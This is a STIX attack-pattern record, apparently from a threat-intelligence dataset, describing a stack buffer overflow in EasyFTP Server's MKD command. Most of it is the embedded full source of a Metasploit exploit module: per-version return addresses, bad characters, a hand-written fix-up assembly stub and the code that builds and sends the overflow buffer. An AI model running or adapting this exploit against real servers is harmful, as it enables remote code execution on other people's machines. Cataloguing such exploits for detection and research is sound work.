{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--87a99795-a4ec-49d7-9397-58fea9e0de92",
    "created": "2024-08-14T16:50:53.373714Z",
    "modified": "2024-08-14T16:50:53.373717Z",
    "name": "EasyFTP Server MKD Command Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11 and earlier. EasyFTP fails to check input size when parsing 'MKD' commands, which leads to a stack based buffer overflow.  NOTE: EasyFTP allows anonymous access by default. However, in order to access the 'MKD' command, you must have access to an account that can create directories.  After version 1.7.0.12, this package was renamed \"UplusFtp\".  This exploit utilizes a small piece of code that I\\'ve referred to as 'fixRet'. This code allows us to inject of payload of ~500 bytes into a 264 byte buffer by 'fixing' the return address post-exploitation.  See references for more information. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/easyftp_mkd_fixret.rb",
            "external_id": "easyftp_mkd_fixret.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EasyFTP Server MKD Command Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11\n        and earlier. EasyFTP fails to check input size when parsing 'MKD' commands, which\n        leads to a stack based buffer overflow.\n\n        NOTE: EasyFTP allows anonymous access by default. However, in order to access the\n        'MKD' command, you must have access to an account that can create directories.\n\n        After version 1.7.0.12, this package was renamed \"UplusFtp\".\n\n        This exploit utilizes a small piece of code that I\\'ve referred to as 'fixRet'.\n        This code allows us to inject of payload of ~500 bytes into a 264 byte buffer by\n        'fixing' the return address post-exploitation.  See references for more information.\n      },\n      'Author'         =>\n        [\n          'x90c <geinblues[at]gmail.com>',   # original version\n          'jduck'   # port to metasploit / modified to use fix-up stub (works with bigger payloads)\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '62134' ],\n          [ 'EDB', '12044' ],\n          [ 'EDB', '14399' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x2f\\x5c\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal - v1.7.0.2',   { 'Ret' => 0x004041ec } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.3',   { 'Ret' => 0x004041ec } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.4',   { 'Ret' => 0x004041dc } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.5',   { 'Ret' => 0x004041a1 } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.6',   { 'Ret' => 0x004041a1 } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.7',   { 'Ret' => 0x004041a1 } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.8',   { 'Ret' => 0x00404481 } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.9',   { 'Ret' => 0x00404441 } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.10',  { 'Ret' => 0x00404411 } ], # call ebp - from ftpbasicsvr.exe\n          [ 'Windows Universal - v1.7.0.11',  { 'Ret' => 0x00404411 } ], # call ebp - from ftpbasicsvr.exe\n        ],\n      'DisclosureDate' => '2010-04-04',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n    disconnect\n\n    if (banner =~ /BigFoolCat/)\n      return Exploit::CheckCode::Detected\n    end\n      return Exploit::CheckCode::Safe\n  end\n\n  def make_nops(num)\n    \"C\" * num\n  end\n\n  def exploit\n    connect_login\n\n    # NOTE:\n    # This exploit jumps to ebp, which happens to point at a partial version of\n    # the 'buf' string in memory. The fixRet below fixes up the code stored on the\n    # stack and then jumps there to execute the payload. The value in esp is used\n    # with an offset for the fixup.\n    fixRet_asm = %q{\n      mov edi,esp\n      sub edi, 0xfffffe10\n      mov [edi], 0xfeedfed5\n      add edi, 0xffffff14\n      jmp edi\n    }\n    fixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new, fixRet_asm).encode_string\n\n    buf = ''\n\n    print_status(\"Prepending fixRet...\")\n    buf << fixRet\n    buf << make_nops(0x20 - buf.length)\n\n    print_status(\"Adding the payload...\")\n    buf << payload.encoded\n\n    # Patch the original stack data into the fixer stub\n    buf[10, 4] = buf[268, 4]\n\n    print_status(\"Overwriting part of the payload with target address...\")\n    buf[268,4] = [target.ret].pack('V') # put return address @ 268 bytes\n\n    print_status(\"Sending exploit buffer...\")\n    send_cmd( ['MKD', buf] , false)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-04",
    "x_mitre_platforms": [
        "win'"
    ]
}